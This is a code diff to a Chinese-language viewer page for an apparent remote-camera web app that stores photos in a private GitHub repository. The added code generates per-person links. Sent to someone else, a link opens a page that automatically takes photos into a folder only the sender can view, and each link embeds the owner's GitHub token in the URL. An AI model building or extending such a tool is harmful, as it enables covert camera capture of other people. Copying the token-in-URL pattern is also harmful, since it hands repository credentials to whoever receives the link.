@@ -26,12 +26,17 @@
   #lb{position:fixed;inset:0;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;z-index:10;cursor:zoom-out}
   #lb img{max-width:96vw;max-height:96vh}
   .empty{padding:40px;text-align:center;color:#888}
+  .card{max-width:520px;margin:16px auto;background:#1a1a1e;border-radius:12px;padding:16px}
+  .grow{display:flex;gap:8px;margin:10px 0}
+  .grow input{flex:1;background:#000;color:#eee;border:1px solid #444;border-radius:8px;padding:8px;font-size:14px}
+  .lbl{font-size:12px;color:#9a9aa2;margin:8px 0 2px}
+  #gout a{display:block;font-size:12px;color:#5b9dff;word-break:break-all;margin:2px 0 6px}
 </style>
 </head>
 <body>
 
 <header>
-  <h1>远程摄像头 · A端查看</h1>
+  <h1>远程摄像头 · A端查看<span id="uinfo"></span></h1>
   <div class="meta">照片：<b id="cnt">0</b> 张 · 最新：<b id="last">—</b> · 每 30 秒自动刷新 <button id="clr" class="danger">清空全部</button></div>
   <div class="burl">B端完整链接（把它发到旧手机浏览器打开即可，无需输入任何内容）： <a id="camUrl" target="_blank"></a> <button id="cp">复制链接</button></div>
 </header>
@@ -41,6 +46,17 @@
   <p>请粘贴 GitHub Token（仅保存在当前浏览器，用于读取私有照片仓库）：</p>
   <textarea id="tk" placeholder="ghp_... 或 github_pat_..."></textarea>
   <p><button id="save">保存并查看</button> <span id="serr" style="color:#f66"></span></p>
+</div>
+
+<div class="card">
+  <b>为新用户生成专属链接</b>
+  <div class="grow"><input id="gname" placeholder="输入代号，如：张三 / u2"><button id="gmk">生成</button></div>
+  <div id="gout" hidden>
+    <div class="lbl">① 拍照链接（发给对方，打开即自动拍照，照片进他专属文件夹）</div>
+    <a id="gcam" target="_blank"></a>
+    <div class="lbl">② 他的专属后台（你自己收藏用；对方浏览器没存 token，打不开）</div>
+    <a id="gadm" target="_blank"></a>
+  </div>
 </div>
 
 <div id="grid"></div>
@@ -57,11 +73,16 @@ var API='https://api.github.com';
 var $=function(id){return document.getElementById(id)};
 var token=null,list=[],shown=48,cache={}; // cache[path]=objectURL
 
-// 链接自带 ?t=TOKEN 时自动保存，并立刻从地址栏清掉 token
-var urlTok=new URLSearchParams(location.search).get('t');
+// 用户代号：?uid=xxx 指定只看谁的照片（存 localStorage 记住）
+var qs=new URLSearchParams(location.search);
+var UID=(qs.get('uid')||'').replace(/[^\w\u4e00-\u9fa5-]/g,'')||localStorage.getItem('cam_uid')||'';
+if(qs.get('uid'))localStorage.setItem('cam_uid',UID);
+
+// 链接自带 ?t=TOKEN 时自动保存，并立刻从地址栏清掉 token（保留 uid）
+var urlTok=qs.get('t');
 if(urlTok){
   localStorage.setItem('cam_token',urlTok);
-  try{history.replaceState(null,'',location.pathname)}catch(e){}
+  try{history.replaceState(null,'',location.pathname+(UID?'?uid='+encodeURIComponent(UID):''))}catch(e){}
 }
 
 $('cp').onclick=function(){
@@ -89,7 +110,8 @@ else{
 async function boot(){
   token=localStorage.getItem('cam_token');
   $('setup').hidden=true;
-  CAM_URL=CAM_BASE+'?t='+encodeURIComponent(token);
+  $('uinfo').textContent=UID?'（用户：'+UID+'）':'';
+  CAM_URL=CAM_BASE+'?t='+encodeURIComponent(token)+(UID?'&uid='+encodeURIComponent(UID):'');
   $('camUrl').textContent=CAM_URL;$('camUrl').href=CAM_URL;
   await refresh();
   setInterval(refresh,30000);
@@ -101,8 +123,9 @@ async function refresh(){
   catch(e){return}
   if(!r.ok)return;
   var j=await r.json();
+  var pre='photos/'+(UID?UID+'/':'');
   list=(j.tree||[]).filter(function(x){
-    return x.type==='blob'&&x.path.indexOf('photos/')===0&&/\.(jpe?g|png)$/i.test(x.path);
+    return x.type==='blob'&&x.path.indexOf(pre)===0&&/\.(jpe?g|png)$/i.test(x.path);
   }).sort(function(a,b){return b.path.localeCompare(a.path)}); // 文件名含时间戳，倒序=最新在前
   $('cnt').textContent=list.length;
   if(list.length){
@@ -162,7 +185,7 @@ async function loadImg(it,img){
 
 $('clr').onclick=async function(){
   if(!list.length)return;
-  if(!confirm('确定删除全部 '+list.length+' 张照片？不可恢复！'))return;
+  if(!confirm('确定删除当前视图的全部 '+list.length+' 张照片？不可恢复！'))return;
   for(var i=0;i<list.length;i++){
     var it=list[i];
     try{
@@ -174,6 +197,25 @@ $('clr').onclick=async function(){
     }catch(e){}
   }
   refresh();
+};
+
+// 链接生成器：给每个新用户生成专属的拍照链接和后台链接
+$('gmk').onclick=function(){
+  var n=($('gname').value||'').trim().replace(/[^\w\u4e00-\u9fa5-]/g,'');
+  if(!n){alert('请输入代号');return}
+  var cam=CAM_BASE+'?t='+encodeURIComponent(token)+'&uid='+encodeURIComponent(n);
+  var adm='https://qqq416423-a11y.github.io/cam-app/?uid='+encodeURIComponent(n);
+  $('gcam').textContent=cam;$('gcam').href=cam;
+  $('gadm').textContent=adm;$('gadm').href=adm;
+  $('gout').hidden=false;
+};
+$('gcam').onclick=function(e){
+  e.preventDefault();
+  navigator.clipboard.writeText($('gcam').textContent).then(function(){$('gcam').textContent='已复制，粘贴发给对方即可'},function(){prompt('请手动复制：',$('gcam').href)});
+};
+$('gadm').onclick=function(e){
+  e.preventDefault();
+  navigator.clipboard.writeText($('gadm').href).then(function(){},function(){prompt('请手动复制：',$('gadm').href)});
 };
 </script>
 </body>
